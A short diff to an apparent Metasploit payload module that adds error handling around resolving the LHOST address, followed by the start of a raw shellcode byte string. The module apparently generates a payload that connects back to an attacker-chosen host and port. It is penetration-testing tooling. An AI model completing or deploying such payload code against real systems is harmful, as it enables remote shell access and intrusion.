@@ -36,7 +36,12 @@ module Metasploit3
 
 	def generate
 		port    = (datastore['LPORT'] || '0').to_i
-		host    = Rex::Socket.resolv_nbo_i(datastore['LHOST'] || '127.0.0.1')
+		host    = nil
+		begin
+			host = Rex::Socket.resolv_nbo_i(datastore['LHOST'] || '127.0.0.1')
+		rescue SocketError
+			host = Rex::Socket.resolv_nbo_i('127.0.0.1')
+		end
 
 		payload =
 			"\x9c\x2b\xa0\x07\x98\x10\x20\x01\x96\x1a\xc0\x0b\x94\x1a\xc0\x0b" +
